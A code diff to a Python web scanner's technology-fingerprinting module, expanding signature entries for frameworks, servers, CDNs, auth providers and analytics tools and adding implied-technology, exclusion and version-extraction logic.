@@ -5,7 +5,7 @@
 #  Categorias: OWASP Top10, IA-Induced, BaaS, Infra/DNS, Recon, OSINT
 # =============================================================================
 
-import os, sys, re, time, json, socket, hashlib, base64, urllib.parse
+import os, sys, re, time, json, socket, hashlib, base64, urllib.parse, math
 import concurrent.futures, threading, random, string, subprocess, shutil, argparse
 from concurrent.futures import ThreadPoolExecutor
 from datetime import datetime
@@ -49,6 +49,12 @@ try:
 except ImportError:
     HAS_REPORTLAB = False
     print(f"{Fore.YELLOW}[AVISO] reportlab não encontrado. PDF não será gerado.{Style.RESET_ALL}")
+
+try:
+    import socks
+    HAS_SOCKS = True
+except ImportError:
+    HAS_SOCKS = False
 
 try:
     from dotenv import load_dotenv
@@ -116,10 +122,13 @@ TECH_FINGERPRINTS = {
         "url_paths": ["/wp-content/", "/wp-includes/", "/wp-login.php", "/wp-admin/", "/xmlrpc.php"],
         "script_src": [r"/wp-content/", r"/wp-includes/"],
         "response_body": [r'content="WordPress\s[\d.]+'],
+        "implies": ["PHP", "MySQL"],
+        "excludes": [],
+        "version_pattern": r'content="WordPress\s([\d.]+)"',
     },
 
     "WooCommerce": {
-        "category": "E-commerce / WordPress plugin",
+        "category": "E-commerce",
         "headers": {},
         "html": [
             r"/wp-content/plugins/woocommerce/",
@@ -131,6 +140,8 @@ TECH_FINGERPRINTS = {
         "js_globals": ["wc_add_to_cart_params", "woocommerce_params", "wc_cart_fragments_params"],
         "script_src": [r"/woocommerce/assets/"],
         "response_body": [],
+        "implies": ["WordPress", "PHP", "MySQL"],
+        "excludes": [],
     },
 
     "Joomla": {
@@ -197,7 +208,7 @@ TECH_FINGERPRINTS = {
     },
 
     "Magento": {
-        "category": "E-commerce / CMS",
+        "category": "E-commerce",
         "headers": {
             "x-magento-tags": r".*",
             "x-magento-vary": r".*",
@@ -219,7 +230,7 @@ TECH_FINGERPRINTS = {
     },
 
     "PrestaShop": {
-        "category": "E-commerce / CMS",
+        "category": "E-commerce",
         "headers": {},
         "html": [
             r"/modules/",
@@ -237,7 +248,7 @@ TECH_FINGERPRINTS = {
     },
 
     "Shopify": {
-        "category": "E-commerce / Hosted CMS",
+        "category": "E-commerce",
         "headers": {
             "x-shopify-stage": r".*",
             "x-shopify-shop-api-call-limit": r".*",
@@ -254,6 +265,8 @@ TECH_FINGERPRINTS = {
         "url_paths": ["/cdn/shop/", "myshopify.com"],
         "script_src": [r"cdn\.shopify\.com", r"shopifycloud\.com"],
         "response_body": [r"Shopify\.shop"],
+        "implies": [],
+        "excludes": ["WordPress", "WooCommerce"],
     },
 
     "Strapi": {
@@ -273,7 +286,7 @@ TECH_FINGERPRINTS = {
     # ─────────────────────────────────────────────────────────────────────────
 
     "React": {
-        "category": "JavaScript Framework",
+        "category": "Frontend Framework",
         "headers": {},
         "html": [
             r'data-reactroot',
@@ -285,10 +298,13 @@ TECH_FINGERPRINTS = {
         "js_globals": ["window.React", "React.__SECRET_INTERNALS"],
         "script_src": [r"react\.development\.js", r"react\.production\.min\.js", r"react-dom"],
         "response_body": [r"_react[A-Za-z]+\s*="],
+        "implies": [],
+        "excludes": [],
+        "version_pattern": r'react(?:\.production|\.development)?\.min\.js\?v=([\d.]+)|react[/@]([\d.]+)',
     },
 
     "Next.js": {
-        "category": "React Framework / SSR",
+        "category": "Meta Framework",
         "headers": {
             "x-powered-by": r"Next\.js",
             "server": r"Next\.js",
@@ -304,10 +320,13 @@ TECH_FINGERPRINTS = {
         "url_paths": ["/_next/static/", "/_next/"],
         "script_src": [r"/_next/static/chunks/", r"/_next/static/js/"],
         "response_body": [r'"buildId":', r'"nextExport":'],
+        "implies": ["React", "Node.js"],
+        "excludes": ["Nuxt.js", "Gatsby"],
+        "version_pattern": r'next[/.-]v?([\d.]+)',
     },
 
     "Vue.js": {
-        "category": "JavaScript Framework",
+        "category": "Frontend Framework",
         "headers": {},
         "html": [
             r"v-app",
@@ -320,10 +339,13 @@ TECH_FINGERPRINTS = {
         "js_globals": ["window.Vue", "Vue.config", "__VUE__"],
         "script_src": [r"vue\.runtime\.min\.js", r"vue\.min\.js", r"vue@"],
         "response_body": [r"vue\.js", r"vue\.min\.js"],
+        "implies": [],
+        "excludes": [],
+        "version_pattern": r'vue(?:\.min)?\.js\?v=([\d.]+)|vue[/@]([\d.]+)',
     },
 
     "Nuxt.js": {
-        "category": "Vue Framework / SSR",
+        "category": "Meta Framework",
         "headers": {
             "x-powered-by": r"Nuxt",
         },
@@ -338,10 +360,13 @@ TECH_FINGERPRINTS = {
         "url_paths": ["/_nuxt/"],
         "script_src": [r"/_nuxt/"],
         "response_body": [r'"nuxtVersion"'],
+        "implies": ["Vue.js", "Node.js"],
+        "excludes": ["Next.js"],
+        "version_pattern": r'nuxt[/.-]v?([\d.]+)',
     },
 
     "Angular": {
-        "category": "JavaScript Framework",
+        "category": "Frontend Framework",
         "headers": {},
         "html": [
             r"ng-version",
@@ -354,10 +379,13 @@ TECH_FINGERPRINTS = {
         "js_globals": ["window.angular", "ng.probe", "getAllAngularRootElements"],
         "script_src": [r"angular\.min\.js", r"angular\.js", r"@angular/core"],
         "response_body": [r'ng-version="'],
+        "implies": ["TypeScript"],
+        "excludes": ["AngularJS"],
+        "version_pattern": r'angular(?:\.min)?\.js\?v=([\d.]+)|angular[/@]([\d.]+)',
     },
 
     "AngularJS": {
-        "category": "JavaScript Framework (Legacy)",
+        "category": "Frontend Framework",
         "headers": {},
         "html": [
             r"ng-app",
@@ -373,7 +401,7 @@ TECH_FINGERPRINTS = {
     },
 
     "Svelte": {
-        "category": "JavaScript Framework",
+        "category": "Frontend Framework",
         "headers": {},
         "html": [
             r"__svelte",
@@ -387,7 +415,7 @@ TECH_FINGERPRINTS = {
     },
 
     "Gatsby": {
-        "category": "React Static Site Generator",
+        "category": "Meta Framework",
         "headers": {},
         "html": [
             r"___gatsby",
@@ -399,10 +427,12 @@ TECH_FINGERPRINTS = {
         "url_paths": ["/page-data/", "/static/gatsby-"],
         "script_src": [r"/commons-", r"webpack-runtime-"],
         "response_body": [r'"gatsby"'],
+        "implies": ["React", "Node.js"],
+        "excludes": ["Next.js"],
     },
 
     "Astro": {
-        "category": "Static Site Framework",
+        "category": "Meta Framework",
         "headers": {
             "x-powered-by": r"Astro",
         },
@@ -419,7 +449,7 @@ TECH_FINGERPRINTS = {
     },
 
     "Alpine.js": {
-        "category": "JavaScript Framework (Lightweight)",
+        "category": "Frontend Framework",
         "headers": {},
         "html": [
             r"x-data",
@@ -436,7 +466,7 @@ TECH_FINGERPRINTS = {
     },
 
     "Ember.js": {
-        "category": "JavaScript Framework",
+        "category": "Frontend Framework",
         "headers": {},
         "html": [
             r"ember-application",
@@ -449,7 +479,7 @@ TECH_FINGERPRINTS = {
     },
 
     "Backbone.js": {
-        "category": "JavaScript Framework",
+        "category": "Frontend Framework",
         "headers": {},
         "html": [],
         "cookies": [],
@@ -459,13 +489,16 @@ TECH_FINGERPRINTS = {
     },
 
     "jQuery": {
-        "category": "JavaScript Library",
+        "category": "Frontend Framework",
         "headers": {},
         "html": [],
         "cookies": [],
         "js_globals": ["window.jQuery", "window.$", "jQuery.fn.jquery"],
         "script_src": [r"jquery[-.\d]*\.min\.js", r"jquery[-.\d]*\.js", r"jquery\.com/jquery"],
         "response_body": [r"jQuery v[\d.]+"],
+        "implies": [],
+        "excludes": [],
+        "version_pattern": r'jquery[.-](\d+\.\d+\.\d+)|jQuery\sv(\d+\.\d+\.\d+)',
     },
 
     # ─────────────────────────────────────────────────────────────────────────
@@ -473,7 +506,7 @@ TECH_FINGERPRINTS = {
     # ─────────────────────────────────────────────────────────────────────────
 
     "Django": {
-        "category": "Backend Framework (Python)",
+        "category": "Backend Framework",
         "headers": {
             "x-frame-options": r"SAMEORIGIN|DENY",  # Django default
         },
@@ -486,10 +519,12 @@ TECH_FINGERPRINTS = {
         "js_globals": [],
         "url_paths": ["/admin/", "/static/admin/"],
         "response_body": [r'name="csrfmiddlewaretoken"'],
+        "implies": ["Python"],
+        "excludes": [],
     },
 
     "FastAPI": {
-        "category": "Backend Framework (Python)",
+        "category": "Backend Framework",
         "headers": {
             "server": r"uvicorn",
             "x-powered-by": r"FastAPI",
@@ -499,10 +534,12 @@ TECH_FINGERPRINTS = {
         "js_globals": [],
         "url_paths": ["/docs", "/redoc", "/openapi.json"],
         "response_body": [r'"openapi":\s*"3\.', r"FastAPI"],
+        "implies": ["Python"],
+        "excludes": [],
     },
 
     "Flask": {
-        "category": "Backend Framework (Python)",
+        "category": "Backend Framework",
         "headers": {
             "server": r"Werkzeug",
         },
@@ -510,10 +547,12 @@ TECH_FINGERPRINTS = {
         "cookies": ["session"],
         "js_globals": [],
         "response_body": [r"Werkzeug"],
+        "implies": ["Python"],
+        "excludes": [],
     },
 
     "Laravel": {
-        "category": "Backend Framework (PHP)",
+        "category": "Backend Framework",
         "headers": {
             "x-powered-by": r"PHP",
         },
@@ -524,10 +563,12 @@ TECH_FINGERPRINTS = {
         "js_globals": [],
         "url_paths": ["/vendor/laravel/"],
         "response_body": [r"laravel"],
+        "implies": ["PHP"],
+        "excludes": [],
     },
 
     "Symfony": {
-        "category": "Backend Framework (PHP)",
+        "category": "Backend Framework",
         "headers": {
             "x-powered-by": r"PHP",
         },
@@ -542,7 +583,7 @@ TECH_FINGERPRINTS = {
     },
 
     "Ruby on Rails": {
-        "category": "Backend Framework (Ruby)",
+        "category": "Backend Framework",
         "headers": {
             "x-powered-by": r"Phusion Passenger",
             "x-runtime": r"[\d.]+",
@@ -558,7 +599,7 @@ TECH_FINGERPRINTS = {
     },
 
     "Express.js": {
-        "category": "Backend Framework (Node.js)",
+        "category": "Backend Framework",
         "headers": {
             "x-powered-by": r"Express",
         },
@@ -566,10 +607,12 @@ TECH_FINGERPRINTS = {
         "cookies": ["connect.sid", "express:sess", "connect:sess"],
         "js_globals": [],
         "response_body": [],
+        "implies": ["Node.js"],
+        "excludes": [],
     },
 
     "Fastify": {
-        "category": "Backend Framework (Node.js)",
+        "category": "Backend Framework",
         "headers": {
             "x-powered-by": r"Fastify",
         },
@@ -580,7 +623,7 @@ TECH_FINGERPRINTS = {
     },
 
     "Spring Boot": {
-        "category": "Backend Framework (Java)",
+        "category": "Backend Framework",
         "headers": {
             "x-application-context": r".*",
         },
@@ -595,7 +638,7 @@ TECH_FINGERPRINTS = {
     },
 
     "ASP.NET": {
-        "category": "Backend Framework (.NET)",
+        "category": "Backend Framework",
         "headers": {
             "x-powered-by": r"ASP\.NET",
             "x-aspnet-version": r"[\d.]+",
@@ -615,7 +658,7 @@ TECH_FINGERPRINTS = {
     },
 
     "ASP.NET Core": {
-        "category": "Backend Framework (.NET Core)",
+        "category": "Backend Framework",
         "headers": {
             "x-powered-by": r"ASP\.NET",
             "server": r"(Kestrel|Microsoft-IIS)",
@@ -627,7 +670,7 @@ TECH_FINGERPRINTS = {
     },
 
     "ColdFusion": {
-        "category": "Backend Framework (Adobe)",
+        "category": "Backend Framework",
         "headers": {
             "x-powered-by": r"ColdFusion",
             "server": r"ColdFusion",
@@ -647,7 +690,7 @@ TECH_FINGERPRINTS = {
     # ─────────────────────────────────────────────────────────────────────────
 
     "Apache": {
-        "category": "Web Server",
+        "category": "Server",
         "headers": {
             "server": r"Apache(?:/[\d.]+)?",
         },
@@ -658,7 +701,7 @@ TECH_FINGERPRINTS = {
     },
 
     "Nginx": {
-        "category": "Web Server",
+        "category": "Server",
         "headers": {
             "server": r"nginx(?:/[\d.]+)?",
         },
@@ -669,7 +712,7 @@ TECH_FINGERPRINTS = {
     },
 
     "IIS": {
-        "category": "Web Server (Microsoft)",
+        "category": "Server",
         "headers": {
             "server": r"Microsoft-IIS/[\d.]+",
         },
@@ -680,7 +723,7 @@ TECH_FINGERPRINTS = {
     },
 
     "LiteSpeed": {
-        "category": "Web Server",
+        "category": "Server",
         "headers": {
             "server": r"LiteSpeed",
             "x-powered-by": r"LiteSpeed",
@@ -692,7 +735,7 @@ TECH_FINGERPRINTS = {
     },
 
     "Caddy": {
-        "category": "Web Server",
+        "category": "Server",
         "headers": {
             "server": r"Caddy",
         },
@@ -725,7 +768,7 @@ TECH_FINGERPRINTS = {
     },
 
     "OpenResty": {
-        "category": "Web Server (Nginx + Lua)",
+        "category": "Server",
         "headers": {
             "server": r"openresty",
         },
@@ -736,7 +779,7 @@ TECH_FINGERPRINTS = {
     },
 
     "Phusion Passenger": {
-        "category": "Application Server",
+        "category": "Server",
         "headers": {
             "server": r"Phusion Passenger",
             "x-powered-by": r"Phusion Passenger",
@@ -752,7 +795,7 @@ TECH_FINGERPRINTS = {
     # ─────────────────────────────────────────────────────────────────────────
 
     "Cloudflare": {
-        "category": "CDN / Security",
+        "category": "CDN/Hosting",
         "headers": {
             "cf-ray": r"[0-9a-f]+-[A-Z]+",
             "cf-cache-status": r".*",
@@ -769,7 +812,7 @@ TECH_FINGERPRINTS = {
     },
 
     "AWS CloudFront": {
-        "category": "CDN (Amazon)",
+        "category": "CDN/Hosting",
         "headers": {
             "x-amz-cf-id": r".*",
             "x-amz-cf-pop": r".*",
@@ -782,7 +825,7 @@ TECH_FINGERPRINTS = {
     },
 
     "AWS (General)": {
-        "category": "Cloud Provider (Amazon)",
+        "category": "Cloud Provider",
         "headers": {
             "x-amz-request-id": r".*",
             "x-amz-id-2": r".*",
@@ -800,7 +843,7 @@ TECH_FINGERPRINTS = {
     },
 
     "Azure": {
-        "category": "Cloud Provider (Microsoft)",
+        "category": "Cloud Provider",
         "headers": {
             "x-ms-request-id": r".*",
             "x-ms-version": r".*",
@@ -818,7 +861,7 @@ TECH_FINGERPRINTS = {
     },
 
     "Google Cloud (GCP)": {
-        "category": "Cloud Provider (Google)",
+        "category": "Cloud Provider",
         "headers": {
             "server": r"(Google Frontend|gws)",
             "via": r"1\.1 google",
@@ -834,7 +877,7 @@ TECH_FINGERPRINTS = {
     },
 
     "Fastly": {
-        "category": "CDN",
+        "category": "CDN/Hosting",
         "headers": {
             "x-served-by": r"cache-[a-z]+",
             "x-cache": r"(HIT|MISS)",
@@ -849,7 +892,7 @@ TECH_FINGERPRINTS = {
     },
 
     "Akamai": {
-        "category": "CDN",
+        "category": "CDN/Hosting",
         "headers": {
             "x-check-cacheable": r".*",
             "akamai-origin-hop": r".*",
@@ -863,7 +906,7 @@ TECH_FINGERPRINTS = {
     },
 
     "Varnish": {
-        "category": "HTTP Cache / CDN",
+        "category": "CDN/Hosting",
         "headers": {
             "x-varnish": r"\d+",
             "via": r"varnish",
@@ -880,7 +923,7 @@ TECH_FINGERPRINTS = {
     # ─────────────────────────────────────────────────────────────────────────
 
     "Sucuri": {
-        "category": "WAF / Security",
+        "category": "WAF",
         "headers": {
             "server": r"Sucuri/Cloudproxy",
             "x-sucuri-id": r".*",
@@ -896,7 +939,7 @@ TECH_FINGERPRINTS = {
     },
 
     "Imperva / Incapsula": {
-        "category": "WAF / Security",
+        "category": "WAF",
         "headers": {
             "x-iinfo": r".*",
             "x-cdn": r"Imperva",
@@ -925,7 +968,7 @@ TECH_FINGERPRINTS = {
     },
 
     "AWS WAF": {
-        "category": "WAF (Amazon)",
+        "category": "WAF",
         "headers": {
             "x-amzn-requestid": r".*",
         },
@@ -936,7 +979,7 @@ TECH_FINGERPRINTS = {
     },
 
     "Cloudflare WAF": {
-        "category": "WAF (Cloudflare)",
+        "category": "WAF",
         "headers": {
             "cf-ray": r"[0-9a-f]+-[A-Z]+",
         },
@@ -967,7 +1010,7 @@ TECH_FINGERPRINTS = {
     },
 
     "Google Tag Manager": {
-        "category": "Tag Management",
+        "category": "Analytics",
         "headers": {},
         "html": [
             r"googletagmanager\.com/gtm\.js",
@@ -1006,7 +1049,7 @@ TECH_FINGERPRINTS = {
     },
 
     "Hotjar": {
-        "category": "Analytics / Heatmaps",
+        "category": "Analytics",
         "headers": {},
         "html": [
             r"static\.hotjar\.com",
@@ -1019,7 +1062,7 @@ TECH_FINGERPRINTS = {
     },
 
     "Facebook Pixel": {
-        "category": "Analytics / Advertising",
+        "category": "Analytics",
         "headers": {},
         "html": [
             r"connect\.facebook\.net/.*fbevents\.js",
@@ -1032,7 +1075,7 @@ TECH_FINGERPRINTS = {
     },
 
     "Intercom": {
-        "category": "Customer Support / Chat",
+        "category": "Customer Support",
         "headers": {},
         "html": [
             r"widget\.intercom\.io",
@@ -1081,7 +1124,7 @@ TECH_FINGERPRINTS = {
     },
 
     "Elasticsearch": {
-        "category": "Search / Database",
+        "category": "Search",
         "headers": {
             "x-elastic-product": r"Elasticsearch",
         },
@@ -1107,6 +1150,7 @@ TECH_FINGERPRINTS = {
         "script_src": [r"bootstrap\.min\.js", r"bootstrap\.bundle\.min\.js"],
         "css_classes": [r"\bcol-(xs|sm|md|lg|xl)-\d+", r"\bcontainer-fluid\b", r"\bnavbar-expand"],
         "response_body": [r"bootstrap\.min\.css", r"bootstrap\.css"],
+        "version_pattern": r'bootstrap[/.-]v?(\d+\.\d+\.\d+)',
     },
 
     "Tailwind CSS": {
@@ -1119,6 +1163,7 @@ TECH_FINGERPRINTS = {
         "js_globals": [],
         "script_src": [r"tailwind(css)?\.min\.js", r"cdn\.tailwindcss\.com"],
         "response_body": [r"cdn\.tailwindcss\.com", r"tailwind\.config\.js"],
+        "version_pattern": r'tailwindcss[/.-]v?(\d+\.\d+\.\d+)',
     },
 
     "Bulma": {
@@ -1138,7 +1183,7 @@ TECH_FINGERPRINTS = {
     # ─────────────────────────────────────────────────────────────────────────
 
     "PHP": {
-        "category": "Programming Language",
+        "category": "Runtime/Language",
         "headers": {
             "x-powered-by": r"PHP/[\d.]+",
         },
@@ -1150,7 +1195,7 @@ TECH_FINGERPRINTS = {
     },
 
     "Node.js": {
-        "category": "Runtime",
+        "category": "Runtime/Language",
         "headers": {
             "x-powered-by": r"(Express|node\.js|Node\.js)",
             "server": r"Node\.js",
@@ -1193,7 +1238,7 @@ TECH_FINGERPRINTS = {
     },
 
     "MongoDB": {
-        "category": "Database (NoSQL)",
+        "category": "Database",
         "headers": {},
         "html": [],
         "cookies": [],
@@ -1207,7 +1252,7 @@ TECH_FINGERPRINTS = {
     },
 
     "Redis": {
-        "category": "Database (In-Memory)",
+        "category": "Database",
         "headers": {},
         "html": [],
         "cookies": [],
@@ -1279,7 +1324,7 @@ TECH_FINGERPRINTS = {
     # ─────────────────────────────────────────────────────────────────────────
 
     "Vercel": {
-        "category": "Hosting / Deployment",
+        "category": "CDN/Hosting",
         "headers": {
             "server": r"Vercel",
             "x-vercel-id": r".*",
@@ -1294,7 +1339,7 @@ TECH_FINGERPRINTS = {
     },
 
     "Netlify": {
-        "category": "Hosting / Deployment",
+        "category": "CDN/Hosting",
         "headers": {
             "server": r"Netlify",
             "x-nf-request-id": r".*",
@@ -1309,7 +1354,7 @@ TECH_FINGERPRINTS = {
     },
 
     "Heroku": {
-        "category": "Hosting / PaaS",
+        "category": "CDN/Hosting",
         "headers": {
             "via": r"1\.1 vegur",
             "server": r"Cowboy",
@@ -1321,7 +1366,7 @@ TECH_FINGERPRINTS = {
     },
 
     "Sentry": {
-        "category": "Error Monitoring",
+        "category": "Monitoring",
         "headers": {
             "x-sentry-id": r".*",
         },
@@ -1362,7 +1407,7 @@ TECH_FINGERPRINTS = {
     },
 
     "Font Awesome": {
-        "category": "Icon Library",
+        "category": "UI Library",
         "headers": {},
         "html": [],
         "cookies": [],
@@ -1372,7 +1417,7 @@ TECH_FINGERPRINTS = {
     },
 
     "Webpack": {
-        "category": "JavaScript Bundler",
+        "category": "Build Tool",
         "headers": {},
         "html": [],
         "cookies": [],
@@ -1382,7 +1427,7 @@ TECH_FINGERPRINTS = {
     },
 
     "Vite": {
-        "category": "JavaScript Bundler / Dev Server",
+        "category": "Build Tool",
         "headers": {},
         "html": [
             r'type="module"',
@@ -1391,6 +1436,289 @@ TECH_FINGERPRINTS = {
         "js_globals": ["__vite__", "__VITE_IS_MODERN__"],
         "script_src": [r"/@vite/client", r"/vite/"],
         "response_body": [r"/@vite/", r"vite\.config\.js"],
+    },
+
+    # ── Modern Meta Frameworks ──────────────────────────────────────────────
+    "Remix": {
+        "category": "Meta Framework",
+        "headers": {"x-remix-response": r".*"},
+        "html": [r"__remix", r"remix-run"],
+        "cookies": [],
+        "js_globals": ["__remixContext", "__remixManifest"],
+        "meta_generator": "",
+        "url_paths": [],
+        "script_src": [r"remix"],
+        "response_body": [],
+        "implies": ["React", "Node.js"],
+        "excludes": ["Next.js", "Nuxt.js"],
+    },
+    "SvelteKit": {
+        "category": "Meta Framework",
+        "headers": {},
+        "html": [r"__sveltekit", r"svelte-kit"],
+        "cookies": [],
+        "js_globals": ["__sveltekit"],
+        "meta_generator": "",
+        "url_paths": [],
+        "script_src": [r"svelte"],
+        "response_body": [],
+        "implies": ["Svelte"],
+        "excludes": ["Next.js"],
+    },
+    "HTMX": {
+        "category": "Frontend Framework",
+        "headers": {"hx-request": r".*"},
+        "html": [r'hx-get=', r'hx-post=', r'hx-trigger=', r'hx-swap='],
+        "cookies": [],
+        "js_globals": ["htmx"],
+        "meta_generator": "",
+        "url_paths": [],
+        "script_src": [r"htmx\.org", r"htmx\.min\.js"],
+        "response_body": [],
+    },
+    "Qwik": {
+        "category": "Meta Framework",
+        "headers": {},
+        "html": [r"qwik", r"q:container"],
+        "cookies": [],
+        "js_globals": ["qwikloader"],
+        "meta_generator": "",
+        "url_paths": [],
+        "script_src": [r"qwik"],
+        "response_body": [],
+    },
+    # ── Auth Providers ──────────────────────────────────────────────────────
+    "Auth0": {
+        "category": "Auth Provider",
+        "headers": {},
+        "html": [r"auth0\.com", r"auth0-lock", r"Auth0Lock"],
+        "cookies": ["auth0", "a0:session"],
+        "js_globals": ["auth0", "Auth0Lock", "Auth0Client"],
+        "meta_generator": "",
+        "url_paths": ["/authorize", "/.well-known/openid-configuration"],
+        "script_src": [r"cdn\.auth0\.com"],
+        "response_body": [],
+    },
+    "Clerk": {
+        "category": "Auth Provider",
+        "headers": {},
+        "html": [r"clerk\.com", r"clerk-js"],
+        "cookies": ["__clerk", "__session"],
+        "js_globals": ["Clerk", "window.Clerk"],
+        "meta_generator": "",
+        "url_paths": [],
+        "script_src": [r"clerk\.com", r"clerk\.js"],
+        "response_body": [],
+    },
+    "NextAuth.js": {
+        "category": "Auth Provider",
+        "headers": {},
+        "html": [],
+        "cookies": ["next-auth.session-token", "__Secure-next-auth.session-token", "next-auth.csrf-token"],
+        "js_globals": [],
+        "meta_generator": "",
+        "url_paths": ["/api/auth/session", "/api/auth/signin", "/api/auth/providers"],
+        "script_src": [],
+        "response_body": [],
+        "implies": ["Next.js"],
+    },
+    "Keycloak": {
+        "category": "Auth Provider",
+        "headers": {},
+        "html": [r"keycloak", r"/auth/realms/"],
+        "cookies": ["KEYCLOAK_SESSION", "KC_RESTART"],
+        "js_globals": ["Keycloak"],
+        "meta_generator": "",
+        "url_paths": ["/auth/realms/", "/auth/admin/"],
+        "script_src": [r"keycloak"],
+        "response_body": [],
+    },
+    # ── BaaS Modern ─────────────────────────────────────────────────────────
+    "PocketBase": {
+        "category": "BaaS",
+        "headers": {},
+        "html": [r"pocketbase", r"pb_auth"],
+        "cookies": ["pb_auth"],
+        "js_globals": ["PocketBase"],
+        "meta_generator": "",
+        "url_paths": ["/api/collections", "/_/"],
+        "script_src": [r"pocketbase"],
+        "response_body": [],
+    },
+    "Appwrite": {
+        "category": "BaaS",
+        "headers": {"x-appwrite-id": r".*"},
+        "html": [r"appwrite"],
+        "cookies": ["a_session_"],
+        "js_globals": ["Appwrite"],
+        "meta_generator": "",
+        "url_paths": ["/v1/account", "/v1/databases"],
+        "script_src": [r"appwrite"],
+        "response_body": [],
+    },
+    # ── Hosting/CDN Modern ──────────────────────────────────────────────────
+    "Cloudflare Pages": {
+        "category": "CDN/Hosting",
+        "headers": {"cf-ray": r".*", "server": r"cloudflare"},
+        "html": [r"pages\.dev"],
+        "cookies": ["__cf_bm"],
+        "js_globals": [],
+        "meta_generator": "",
+        "url_paths": [],
+        "script_src": [],
+        "response_body": [],
+        "implies": ["Cloudflare"],
+    },
+    "Railway": {
+        "category": "CDN/Hosting",
+        "headers": {"x-railway-project": r".*"},
+        "html": [],
+        "cookies": [],
+        "js_globals": [],
+        "meta_generator": "",
+        "url_paths": [],
+        "script_src": [],
+        "response_body": [],
+    },
+    "Render": {
+        "category": "CDN/Hosting",
+        "headers": {"x-render-origin-server": r".*"},
+        "html": [],
+        "cookies": [],
+        "js_globals": [],
+        "meta_generator": "",
+        "url_paths": [],
+        "script_src": [],
+        "response_body": [],
+    },
+    "Fly.io": {
+        "category": "CDN/Hosting",
+        "headers": {"fly-request-id": r".*", "server": r"Fly/.*"},
+        "html": [],
+        "cookies": [],
+        "js_globals": [],
+        "meta_generator": "",
+        "url_paths": [],
+        "script_src": [],
+        "response_body": [],
+    },
+    # ── Analytics Modern ────────────────────────────────────────────────────
+    "PostHog": {
+        "category": "Analytics",
+        "headers": {},
+        "html": [r"posthog", r"ph\.autocapture"],
+        "cookies": [],
+        "js_globals": ["posthog"],
+        "meta_generator": "",
+        "url_paths": [],
+        "script_src": [r"posthog", r"us\.posthog\.com"],
+        "response_body": [],
+    },
+    "Plausible": {
+        "category": "Analytics",
+        "headers": {},
+        "html": [],
+        "cookies": [],
+        "js_globals": ["plausible"],
+        "meta_generator": "",
+        "url_paths": [],
+        "script_src": [r"plausible\.io"],
+        "response_body": [],
+    },
+    # ── API/GraphQL ─────────────────────────────────────────────────────────
+    "Apollo GraphQL": {
+        "category": "API Gateway",
+        "headers": {"x-apollo-gateway": r".*"},
+        "html": [r"apollo", r"__APOLLO_STATE__"],
+        "cookies": [],
+        "js_globals": ["__APOLLO_STATE__", "__APOLLO_CLIENT__"],
+        "meta_generator": "",
+        "url_paths": ["/graphql"],
+        "script_src": [r"apollo"],
+        "response_body": [],
+    },
+    "tRPC": {
+        "category": "API Gateway",
+        "headers": {},
+        "html": [r"trpc"],
+        "cookies": [],
+        "js_globals": ["__TRPC__"],
+        "meta_generator": "",
+        "url_paths": ["/api/trpc/"],
+        "script_src": [r"trpc"],
+        "response_body": [],
+    },
+    # ── State Management ────────────────────────────────────────────────────
+    "Zustand": {
+        "category": "State Management",
+        "headers": {},
+        "html": [],
+        "cookies": [],
+        "js_globals": [],
+        "meta_generator": "",
+        "url_paths": [],
+        "script_src": [r"zustand"],
+        "response_body": [r"zustand"],
+    },
+    "Pinia": {
+        "category": "State Management",
+        "headers": {},
+        "html": [],
+        "cookies": [],
+        "js_globals": ["__pinia"],
+        "meta_generator": "",
+        "url_paths": [],
+        "script_src": [r"pinia"],
+        "response_body": [],
+        "implies": ["Vue.js"],
+    },
+    # ── AI/LLM ──────────────────────────────────────────────────────────────
+    "Vercel AI SDK": {
+        "category": "AI/ML",
+        "headers": {},
+        "html": [r"ai\.vercel"],
+        "cookies": [],
+        "js_globals": [],
+        "meta_generator": "",
+        "url_paths": ["/api/chat"],
+        "script_src": [r"ai\.vercel"],
+        "response_body": [],
+        "implies": ["Vercel"],
+    },
+    "LangChain": {
+        "category": "AI/ML",
+        "headers": {},
+        "html": [r"langchain"],
+        "cookies": [],
+        "js_globals": [],
+        "meta_generator": "",
+        "url_paths": ["/api/langchain"],
+        "script_src": [r"langchain"],
+        "response_body": [r"langchain"],
+    },
+    # ── CMS Headless Modern ─────────────────────────────────────────────────
+    "Directus": {
+        "category": "Headless CMS",
+        "headers": {},
+        "html": [r"directus"],
+        "cookies": ["directus_session_token"],
+        "js_globals": [],
+        "meta_generator": "Directus",
+        "url_paths": ["/admin/login", "/items/"],
+        "script_src": [],
+        "response_body": [],
+    },
+    "Payload CMS": {
+        "category": "Headless CMS",
+        "headers": {},
+        "html": [r"payload-cms", r"payloadcms"],
+        "cookies": ["payload-token"],
+        "js_globals": [],
+        "meta_generator": "",
+        "url_paths": ["/admin", "/api/globals/"],
+        "script_src": [],
+        "response_body": [],
+        "implies": ["Node.js"],
     },
 
 }
@@ -1528,7 +1856,110 @@ def detect_technologies(
         if evidence:
             results[tech] = list(dict.fromkeys(evidence))  # deduplicate, preserve order
 
+    # ── Post-processing: implies, excludes, version ──────────────────────
+    # Add implied technologies
+    implied_add = {}
+    for tech in list(results.keys()):
+        raw = TECH_FINGERPRINTS.get(tech, {})
+        for imp in raw.get("implies", []):
+            if imp not in results and imp not in implied_add:
+                implied_add[imp] = [f"implied_by:{tech}"]
+    results.update(implied_add)
+
+    # Remove excluded technologies
+    to_remove = set()
+    for tech in results:
+        raw = TECH_FINGERPRINTS.get(tech, {})
+        for exc in raw.get("excludes", []):
+            if exc in results:
+                # Keep the one with more evidence
+                if len(results.get(exc, [])) <= len(results.get(tech, [])):
+                    to_remove.add(exc)
+    for r in to_remove:
+        results.pop(r, None)
+
+    # Extract versions
+    for tech in results:
+        raw = TECH_FINGERPRINTS.get(tech, {})
+        vp = raw.get("version_pattern")
+        if vp and body:
+            m = re.search(vp, body + " ".join(str(v) for v in norm_headers.values()))
+            if m:
+                ver = next((g for g in m.groups() if g), None)
+                if ver:
+                    results[tech].append(f"version:{ver}")
+
     return results
+
+
+def _detect_dns_hosting(domain):
+    """Detect hosting provider from DNS CNAME records."""
+    _dns_hosting_map = {
+        "vercel-dns.com": "Vercel",
+        "vercel.app": "Vercel",
+        "netlify.app": "Netlify",
+        "netlify.com": "Netlify",
+        "cloudfront.net": "CloudFront",
+        "github.io": "GitHub Pages",
+        "herokuapp.com": "Heroku",
+        "azurewebsites.net": "Azure",
+        "firebaseapp.com": "Firebase",
+        "appspot.com": "Google App Engine",
+        "fly.dev": "Fly.io",
+        "railway.app": "Railway",
+        "render.com": "Render",
+        "pages.dev": "Cloudflare Pages",
+    }
+    detected = []
+    try:
+        import dns.resolver as _dr
